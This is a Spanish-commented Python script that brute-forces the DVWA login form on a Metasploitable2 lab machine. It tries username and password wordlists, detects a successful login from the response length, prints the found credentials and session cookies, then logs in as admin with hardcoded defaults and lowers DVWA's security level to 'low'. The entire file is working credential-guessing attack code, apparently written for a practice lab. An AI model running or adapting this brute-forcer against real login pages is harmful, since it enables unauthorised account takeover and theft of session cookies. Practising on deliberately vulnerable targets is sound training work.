#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
class Preparacion:
    """ Esta clase es para automatizar la intrusion y el cambio de dificultad para la base de datos DVWA de la
     máquina metarsploitable2 y contiene el método brute_forze para extraer las credenciales,
    y el método change_difficult para cambiar la dificultad a low.
    """
    def __init__(self, ip):
        self.session = requests.Session()
        self.ip = ip
        self.login_url = 'http://' + str(self.ip) + '/dvwa/login.php'
        # URL de la página de configuración de seguridad.
        self.security_url = 'http://' + str(self.ip) + '/dvwa/security.php'

    def brute_forze(self):
        found = False
        with open('users.txt', 'r') as mngr_user:
            for user in mngr_user:
                if found:
                    break
                username = user.strip()  # Elimina saltos de línea y espacios.
                with open('passwd.txt', 'r') as mngr_passwd:
                    for passwd in mngr_passwd:
                        if found:
                            break
                        password = passwd.strip()  # Elimina saltos de línea y espacios.
                        # Crear un diccionario con los datos del formulario.
                        data = {
                            'username': username,
                            'password': password,
                            'Login': 'Login'
                        }
                        # Enviar una solicitud POST al formulario se sigen redirecciones para evaluar tamaño de la respuesta.
                        response = self.session.post(self.login_url, data=data, allow_redirects=True)
                        if 'Content-Length' in response.headers:
                            content_size = int(response.headers['Content-Length'])
                            if content_size != 1328:
                                print(f'Credenciales encontradas Username: {username} - Contraseña: {password}')
                                cookies = self.session.cookies
                                print('Cookies de sesión:')
                                for cookie in cookies:
                                    print(cookie.name, ':', cookie.value)
                                found = True
                                break
        return username, passwd
    def change_difficult(self, usuario, clave):
        # Datos del formulario de inicio de sesión.
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }

        # Realizar la solicitud de inicio de sesión.
        #session = requests.Session()
        self.session.post(self.login_url, data=login_data)

        # Datos para cambiar la dificultad a "low"
        security_data = {
            'security': 'low',
            'seclev_submit': 'Submit'
        }

        # Realizar la solicitud para cambiar la dificultad a "low".
        response = self.session.post(self.security_url, data=security_data)

        # Verificar si la solicitud fue exitosa.
        if response.status_code == 200:
            print('La dificultad se cambió a "low"')

            cookies = self.session.cookies
            for cookie in cookies:
                print(cookie.name, ':', cookie.value)

        else:
            print('Hubo un error al cambiar la dificultad')
        return self.session

if __name__ == '__main__':
    objete = Preparacion('192.168.23.141')
    user, passwd = objete.brute_forze()
    galletas = objete.change_difficult(user, passwd)
